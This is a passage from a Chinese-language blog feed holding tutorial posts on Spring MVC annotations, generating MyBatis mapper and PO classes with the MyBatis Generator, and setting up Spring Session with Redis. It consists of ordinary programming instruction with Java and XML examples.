class="keyword">import</span> org.springframework.web.bind.annotation.SessionAttributes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cqvie.model.User;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SessionAttributes</span>(value = &#123;<span class="string">"user"</span>&#125;, types = &#123;String.class&#125;)</span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/springmvc"</span>)</span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SessionAttributesTest</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@SessionAttributes</span></span></span><br><span class="line"><span class="comment">     *         除了可以通过属性名指定需要放到会话中的属性外（value 属性值），</span></span><br><span class="line"><span class="comment">     *         还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中（types 属性值）。</span></span><br><span class="line"><span class="comment">     * 注意： 该注解只能放在类的上面，不能放在方法上面</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/testSessionAttributes"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testSessionAttributes</span><span class="params">(Map&lt;String, Object&gt; map)</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="number">1</span>, <span class="string">"刘邦"</span>, <span class="string">"qwe"</span>, <span class="string">"123"</span>, <span class="string">"辽宁"</span>);</span><br><span class="line">        map.put(<span class="string">"user"</span>, user);</span><br><span class="line">        map.put(<span class="string">"school"</span>, <span class="string">"重庆"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ModelAttribute"><a href="#ModelAttribute" class="headerlink" title="@ModelAttribute"></a>@ModelAttribute</h2><p>　　代表的是：该Controller的所有方法在调用前，先执行此@ModelAttribute方法，可用于注解和方法参数中，可以把这个@ModelAttribute特性，应用在BaseController当中，所有的Controller继承BaseController，即可实现在调用Controller时，先执行@ModelAttribute方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cqvie.yjq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ModelAttribute;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cqvie.model.User;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/springmvc"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAttributeTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String SUCCESS = <span class="string">"success"</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 1.有 <span class="doctag">@ModelAttribute</span> 标记的方法，会在每个目标方法执行之前被 SpringMVC 调用</span></span><br><span class="line"><span class="comment">     * 2.<span class="doctag">@ModelAttribute</span>注解也可以修饰目标方法POJO类形的入参，其value的属性值有如下作用：</span></span><br><span class="line"><span class="comment">     *     1）SpringMVC会使用value属性值在implicitModel中查找对应的对象，若存在则直接传入到目标方法的入参中</span></span><br><span class="line"><span class="comment">     *     2）SpringMVC会以value为key,POJO类型的对象为value，存入的request中</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> map</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ModelAttribute</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getUser</span><span class="params">(@RequestParam(value = <span class="string">"id"</span>, required = <span class="keyword">false</span>)</span> <span class="keyword">int</span> id,</span></span><br><span class="line"><span class="function">            Map&lt;String, Object&gt; map) </span>&#123;</span><br><span class="line">        <span class="comment">//模拟数据库中获取对象</span></span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="number">1</span>, <span class="string">"刘邦"</span>, <span class="string">"123"</span>, <span class="string">"023"</span>, <span class="string">"重庆"</span>);</span><br><span class="line">        System.out.println(<span class="string">"从数据库中获取一个对象："</span> + user);</span><br><span class="line">        map.put(<span class="string">"abc"</span>, user);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 运行流程：</span></span><br><span class="line"><span class="comment">     *         1.执行<span class="doctag">@ModelAttribute</span>注解修饰的方法，从数据库中取出对象，把对象放入Map中，键为：user；</span></span><br><span class="line"><span class="comment">     *         2.SpringMVC从Map中取出User对象，并把表单的请求参数赋值给该User对象的对应属性；</span></span><br><span class="line"><span class="comment">     *         3.SpringMVC把上述对象传入目标方法的参数。</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * 注意：在<span class="doctag">@ModelAttribute</span>修饰的方法中，放入到Map时的键需要和目标方法入参类型的第一个字母小写的字符串一致</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/testModelAttribute"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testModelAttribute</span><span class="params">(@ModelAttribute(<span class="string">"abc"</span>)</span> User user) </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"修改："</span> + user);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ResponseBody"><a href="#ResponseBody" class="headerlink" title="@ResponseBody　"></a>@ResponseBody　</h2><p>　　作用： 该注解用于将Controller的方法返回的对象，通过适当的HttpMessageConverter转换为指定格式后，写入到Response对象的body数据区。</p><p>使用时机：返回的数据不是html标签的页面，而是其他某种格式的数据时（如json、xml等）使用；</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Controller&quot;&gt;&lt;a href=&quot;#Controller&quot; class=&quot;headerlink&quot; title=&quot;@Controller&quot;&gt;&lt;/a&gt;@Controller&lt;/h2&gt;&lt;p&gt;用于注解控制层，@Controller 用于标记在一个类上，使用它标记的类就是一个SpringMVC Controller 对象。分发处理器将会扫描使用了该注解的类的方法，并检测该方法是否使用了@RequestMapping 注解。@Controller 只是定义了一个控制器类，而使用@RequestMapping 注解的方法才是真正处理请求的处理器。
    
    </summary>
    
      <category term="SpingMVC" scheme="https://aunsetre.top/categories/SpingMVC/"/>
    
    
  </entry>
  
  <entry>
    <title>使用IDEA生成Mybatis逆向工程</title>
    <link href="https://aunsetre.top/2018/03/05/%E4%BD%BF%E7%94%A8IDEA%E7%94%9F%E6%88%90Mybatis%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    <id>https://aunsetre.top/2018/03/05/使用IDEA生成Mybatis逆向工程/</id>
    <published>2018-03-04T16:00:00.000Z</published>
    <updated>2018-06-09T10:36:37.923Z</updated>
    
    <content type="html"><![CDATA[<p>以往我们在开发时都需要通过数据库中的表然后自己在po包下建立相对应的pojo类，并要创建相应的mapper.xml写出对表的所有操作，而使用mybatis逆向工程就不用我们自己再编写pojo类与相应的mapper.java和mapper.xml文件，它可以自动对单表生成sql，包括:mapper.xml、mapper.java、表名.java(po类)。是不是很方便？接下来我将为你们介绍如何使用mybatis的逆向工程，只需三步便可以简单做到。</p><p>首先我们需要在官网下载:<a href="http://www.mybatis.org/generator/" target="_blank" rel="noopener">逆向工程开发文档</a>以及jar包:mybatis-generator-core-bundle。为什么我的标题要注明使用的开发工具是IDEA呢?用IDEA的好处就是可以使用Maven依赖，但是此篇文章中我们就新建一个普通工程，所以此篇文章讲解的配置在其他开发工具中能实现同样的效果。<a id="more"></a></p><h2 id="1-逆向工程使用配置"><a href="#1-逆向工程使用配置" class="headerlink" title="1.逆向工程使用配置"></a>1.逆向工程使用配置</h2><h3 id="1-1jar包的导入"><a href="#1-1jar包的导入" class="headerlink" title="1.1jar包的导入"></a>1.1jar包的导入</h3><p>这里我们需要导入四个包，1.mybatis3.xjar包。2.逆向工程核心包。3.数据库连接包。4.log4j.jar，用于输出日志。目录如下:</p><p><img src="http://static.aunsetre.top/hexo/img/asdasd1232017117.png" alt="(mybatis1)">.2配置逆向工程的配置文件</p><p>在src包下创建逆向工程配置文件generatorConfig.xml,内容如下，直接拷贝官网介绍的内容即可:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE generatorConfiguration</span></span><br><span class="line"><span class="meta">  PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"</span></span><br><span class="line"><span class="meta">  "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">"testTables"</span> <span class="attr">targetRuntime</span>=<span class="string">"MyBatis3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 是否去除自动生成的注释 true：是 ： false:否 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suppressAllComments"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--数据库连接的信息：驱动类、连接地址、用户名、密码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">"com.mysql.jdbc.Driver"</span></span></span><br><span class="line"><span class="tag"><span class="attr">connectionURL</span>=<span class="string">"jdbc:mysql://localhost:3306/mybatis"</span> <span class="attr">userId</span>=<span class="string">"root"</span></span></span><br><span class="line"><span class="tag"><span class="attr">password</span>=<span class="string">"xiaxunwu1996."</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;jdbcConnection driverClass="oracle.jdbc.OracleDriver"</span></span><br><span class="line"><span class="comment">connectionURL="jdbc:oracle:thin:@127.0.0.1:1521:yycg"</span></span><br><span class="line"><span class="comment">userId="yycg"</span></span><br><span class="line"><span class="comment">password="yycg"&gt;</span></span><br><span class="line"><span class="comment">&lt;/jdbcConnection&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 默认false，把JDBC DECIMAL 和 NUMERIC 类型解析为 Integer，为 true时把JDBC DECIMAL 和</span></span><br><span class="line"><span class="comment">NUMERIC 类型解析为java.math.BigDecimal --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">javaTypeResolver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"forceBigDecimals"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">javaTypeResolver</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- targetProject:生成PO类的位置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">"po"</span></span></span><br><span class="line"><span class="tag"><span class="attr">targetProject</span>=<span class="string">".\src"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- enableSubPackages:是否让schema作为包的后缀 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 从数据库返回的值被清理前后的空格 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"trimStrings"</span> <span class="attr">value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- targetProject:mapper映射文件生成的位置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">"mapper"</span></span></span><br><span class="line"><span class="tag"><span class="attr">targetProject</span>=<span class="string">".\src"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- enableSubPackages:是否让schema作为包的后缀 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- targetPackage：mapper接口生成的位置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">type</span>=<span class="string">"XMLMAPPER"</span></span></span><br><span class="line"><span class="tag"><span class="attr">targetPackage</span>=<span class="string">"mapper"</span></span></span><br><span class="line"><span class="tag"><span class="attr">targetProject</span>=<span class="string">".\src"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- enableSubPackages:是否让schema作为包的后缀 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"enableSubPackages"</span> <span class="attr">value</span>=<span class="string">"false"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 指定数据库表 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">"items"</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">"orders"</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">"orderdetail"</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;table schema="" tableName="sys_user"&gt;&lt;/table&gt;</span></span><br><span class="line"><span class="comment">&lt;table schema="" tableName="sys_role"&gt;&lt;/table&gt;</span></span><br><span class="line"><span class="comment">&lt;table schema="" tableName="sys_permission"&gt;&lt;/table&gt;</span></span><br><span class="line"><span class="comment">&lt;table schema="" tableName="sys_user_role"&gt;&lt;/table&gt;</span></span><br><span class="line"><span class="comment">&lt;table schema="" tableName="sys_role_permission"&gt;&lt;/table&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 有些表的字段需要指定java类型</span></span><br><span class="line"><span class="comment"> &lt;table schema="" tableName=""&gt;</span></span><br><span class="line"><span class="comment">&lt;columnOverride column="" javaType="" /&gt;</span></span><br><span class="line"><span class="comment">&lt;/table&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要修改的地方:</p><ul><li>javaModelGenerator,生成PO类的位置</li><li>sqlMapGenerator,mapper映射文件生成的位置</li><li>javaClientGenerator,mapper接口生成的位置</li><li>table,其tableName属性对应数据库中相应表</li></ul><h3 id="1-3执行生成代码"><a href="#1-3执行生成代码" class="headerlink" title="1.3执行生成代码"></a>1.3执行生成代码</h3><p>在src包下新建一个Generator.java文件，内容如下，也是拷贝的官网中介绍的代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.api.MyBatisGenerator;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.config.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.config.xml.ConfigurationParser;</span><br><span class="line"><span class="keyword">import</span> org.mybatis.generator.internal.DefaultShellCallback;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GeneratorSqlmap</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">generator</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; warnings = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        <span class="keyword">boolean</span> overwrite = <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment">//指定 逆向工程配置文件</span></span><br><span class="line">        File configFile = <span class="keyword">new</span> File(<span class="string">"src/generatorConfig.xml"</span>);</span><br><span class="line">        ConfigurationParser cp = <span class="keyword">new</span> ConfigurationParser(warnings);</span><br><span class="line">        Configuration config = cp.parseConfiguration(configFile);</span><br><span class="line">        DefaultShellCallback callback = <span class="keyword">new</span> DefaultShellCallback(overwrite);</span><br><span class="line">        MyBatisGenerator myBatisGenerator = <span class="keyword">new</span> MyBatisGenerator(config,</span><br><span class="line">                callback, warnings);</span><br><span class="line">        myBatisGenerator.generate(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            GeneratorSqlmap generatorSqlmap = <span class="keyword">new</span> GeneratorSqlmap();</span><br><span class="line">            generatorSqlmap.generator();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，这里new File中传入的参数只能是<code>src/generatorConfig.xml</code>而不能为<code>generatorConfig.xml</code>，否则会出现<code>java.io.FileNotFoundException: generatorConfig.xml (No such file or directory)</code>的报错信息，运行程序，在打印台看到输出日志信息为:<a href="http://od2xrf8gr.bkt.clouddn.com/111.png" target="_blank" rel="noopener"><img src="http://static.aunsetre.top/hexo/img/mybatis/111.png" alt="img"></a></p><p>然后再点击文件目录上的刷新图标刷新文件目录，文件目录下出现我们通过单表映射出来的po类包以及mapper包下的mapper.xml和mapper.java，刚开始的工程目录如下:<br><a href="http://od2xrf8gr.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-15%20%E4%B8%8B%E5%8D%885.55.50.png" target="_blank" rel="noopener"><img src="http://static.aunsetre.top/hexo/img/mybatis/2016-11asd12.png" alt="img"></a><br>运行程序后最后的工程目录结构如下:</p><p><a href="http://od2xrf8gr.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202016-11-15%20%E4%B8%8B%E5%8D%885.53.21.png" target="_blank" rel="noopener"><img src="http://static.aunsetre.top/hexo/img/mybatis/asdasdq.png" alt="img"></a></p><p>这样我们便通过mybatis的逆向工程完成了通过单表直接创建出对应的mapper.java和mapper.xml的工作。</p><h2 id="2-逆向工程的应用"><a href="#2-逆向工程的应用" class="headerlink" title="2.逆向工程的应用"></a>2.逆向工程的应用</h2><p>逆向工程往往是单独的建立一个普通工程如A，通过运行逆向工程生成相应的mapper和po后然后再将这两个包拷贝到我们使用到ssm框架创建的web项目，而不是直接在web项目中使用逆向工程。</p><p>通过运行上述的程序，我们便通过数据库中的表快速的生成了相应的po类和mapper，而不用我们程序员自己再编写相应的po类和mapper，为我们带来了很大的方便，所以这个一定要学会，在后续开发中只要使用到mybatis的地方我们都会通过mybatis的逆向工程自动为我们生成mapper和po类。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以往我们在开发时都需要通过数据库中的表然后自己在po包下建立相对应的pojo类，并要创建相应的mapper.xml写出对表的所有操作，而使用mybatis逆向工程就不用我们自己再编写pojo类与相应的mapper.java和mapper.xml文件，它可以自动对单表生成sql，包括:mapper.xml、mapper.java、表名.java(po类)。是不是很方便？接下来我将为你们介绍如何使用mybatis的逆向工程，只需三步便可以简单做到。&lt;/p&gt;
&lt;p&gt;首先我们需要在官网下载:&lt;a href=&quot;http://www.mybatis.org/generator/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;逆向工程开发文档&lt;/a&gt;以及jar包:mybatis-generator-core-bundle。为什么我的标题要注明使用的开发工具是IDEA呢?用IDEA的好处就是可以使用Maven依赖，但是此篇文章中我们就新建一个普通工程，所以此篇文章讲解的配置在其他开发工具中能实现同样的效果。
    
    </summary>
    
      <category term="Mybatis" scheme="https://aunsetre.top/categories/Mybatis/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring Session整合</title>
    <link href="https://aunsetre.top/2018/03/01/Spring-Session%E6%95%B4%E5%90%88/"/>
    <id>https://aunsetre.top/2018/03/01/Spring-Session整合/</id>
    <published>2018-02-28T16:00:00.000Z</published>
    <updated>2018-07-02T13:22:47.603Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>花了大半天时间，解决了springMVC项目增加spring-session共享session报了异常 java.lang.ClassNotFoundException:com.lambdaworks.</p></blockquote><p>花了大半天时间，解决了springMVC项目增加spring-session共享session报了异常<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.lang.ClassNotFoundException:com.lambdaworks.redis.AbstractRedisClient</span><br><span class="line">java.lang.ClassNotFoundException:com.lambdaworks.redis.RedisException</span><br></pre></td></tr></table></figure><h1 id="前情"><a href="#前情" class="headerlink" title="前情"></a>前情</h1><p>项目做了前后端分离，springMVC项目部署在三台tomcat上，前端部署在另三台tomcat上，然后HA做了分发处理，使一个用户访问后，后面的访问都会是其中的某一台tomcat… 理想是美好的，现实中，会出现登录前后会有连接是访问了不同的tomcat，我没有运维权限，也不想接这个坑，所以就从代码上处理吧。<br>代码上怎么处理呢，我觉得很简单，session共享不就行了，使用spring-session超简单，几行代码就搞定了。注意：这里的超简单是在spring-boot中使用才超简单。spring-boot中使用redis共享session配置：<br>1、pom.xml加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.session<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-session<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.session<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-session-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、application.properties加配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.session.store-type=redis</span><br></pre></td></tr></table></figure><p>搞定<br>但是，我的项目不是spring-boot项目，所以参考官网说的配吧。我的部署环境jdk是1.7、tomcat7，所以sprint-session 2.0.x是肯定不能支持了，所以还是使用1.3.3吧，<a href="https://docs.spring.io/spring-session/docs/1.3.3.RELEASE/reference/html5/?spm=a2c4e.11153940.blogcont596244.14.77454125iH9GOf#httpsession-how" target="_blank" rel="noopener">官网手册</a><br>很简单，有web.xml，所以配置分2步：<br>1、 在spring-context.xml中加上配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.session.data.redis.config.annotation.web.http.RedisHttpSessionConfiguration"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>2、在web.xml加上</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 